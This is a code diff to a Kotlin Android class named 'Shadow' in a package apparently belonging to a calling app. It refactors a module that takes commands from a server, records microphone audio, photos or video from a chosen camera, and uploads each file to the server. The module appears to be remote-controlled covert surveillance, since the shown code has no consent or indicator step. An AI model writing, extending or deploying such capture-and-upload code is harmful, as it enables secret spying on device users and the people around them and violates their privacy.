@@ -1,17 +1,15 @@
 package com.hc.calling.commands.shadow
 
 import android.content.Context
-import android.hardware.camera2.CameraDevice
-import android.os.Handler
-import android.view.Surface
+import android.os.Build
 import com.google.gson.Gson
 import com.hc.calling.commands.Command
 import com.hc.calling.commands.Executor
 import com.hc.calling.commands.shadow.data.ShadowDTO
 import com.hc.calling.commands.shadow.data.ShadowVM
 import com.hc.calling.commands.shadow.mic.util.RecoderHelper
-import com.hc.calling.commands.shadow.util.Photographer
-import com.hc.calling.commands.shadow.util.VideoRecoder
+import com.hc.calling.commands.shadow.vision.camera.Camera1Control
+import com.hc.calling.commands.shadow.vision.camera.Camera2Control
 import com.hc.calling.util.DateUtil
 import com.orhanobut.logger.Logger
 import java.io.File
@@ -24,6 +22,8 @@ import java.io.File
 
 class Shadow(context: Context) : Command(), Executor {
     private val mContext = context
+    private val recorders = mutableListOf(Camera1Control(mContext), Camera2Control(mContext))
+    private val cameraVersion = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) 1 else 0
 
     companion object {
         const val SEND_SHADOW = "send_shadow"
@@ -45,10 +45,10 @@ class Shadow(context: Context) : Command(), Executor {
         val dto = Gson().fromJson(data[0].toString(), ShadowDTO::class.java)
         val serverCommand = dto.type
         val camera = dto.camera
-
+        var path =
+            File(mContext.getExternalFilesDir(null), DateUtil.GetNowDate("yyyy-MM-ddHHmmss")).path
         if (serverCommand == SEND_VOICE) {
-            val path =
-                File(mContext.getExternalFilesDir(null), DateUtil.GetNowDate("yyyy-MM-ddHHmmss") + ".mp3").path
+            path = "$path.mp3"
             RecoderHelper(mContext) {
                 ShadowVM().upLoadFile(File(path)) {
                     emitData(SHADOW, "voice upload success")
@@ -57,27 +57,7 @@ class Shadow(context: Context) : Command(), Executor {
             }.record(path)
 
         } else {
-            Photographer(
-                mContext
-            ) { builder, session, device, imageReader, surfaces, handler ->
-                when (serverCommand) {
-                    SEND_PIC -> {
-                        // take photo and post the photo to server
-                        Photographer.capture(mContext, builder, session, imageReader, device, handler) {
-                            ShadowVM().upLoadFile(File(it)) { data ->
-                                Logger.i(data)
-                                emitData(SHADOW, "pic upload success")
-                            }
-                        }
-                    }
-                    SEND_VIDEO -> {
-                        record(device, surfaces, handler)
-                    }
-
-
-                }
-            }
-                .openCamera(camera)
+            shadow(cameraVersion, serverCommand, camera, path)
         }
 
     }
@@ -86,21 +66,35 @@ class Shadow(context: Context) : Command(), Executor {
     /**
      * upload the video when record complete
      */
-    fun record(device: CameraDevice, surface: MutableList<Surface>, handler: Handler) {
-        val path = File(mContext.getExternalFilesDir(null), DateUtil.GetNowDate("yyyy-MM-ddHHmmss") + ".mp4").path
-//        VideoRecoder().apply {
-//            initMediaRecorde(path)
-//            requestRecord(device, surface, handler)
-//            {
-//                ShadowVM().upLoadFile(File(it)) { data ->
-//                    Logger.i(data)
-//                    emitData(SHADOW, "video upload success")
-//                }
-//            }
-//
-//        }
+    private fun shadow(cameraVersion: Int, type: String, camera: String, filePath: String) {
+        recorders[cameraVersion].apply {
+            this.mCamera = camera
+            this.mFilePath = filePath
+            this.initMediaRecorder {
+                when (type) {
+                    SEND_PIC -> {
+                        this.takePhoto {
+                            uploadFile(it)
+                        }
+                    }
+
+                    SEND_VIDEO -> {
+                        this.record {
+                            uploadFile(it)
+                        }
+                    }
+                }
+            }
+
+        }
 
     }
 
+    private fun uploadFile(filePath: String) {
+        ShadowVM().upLoadFile(File(filePath)) { data ->
+            Logger.i(data)
+            emitData(SHADOW, "success")
+        }
+    }
 
 }
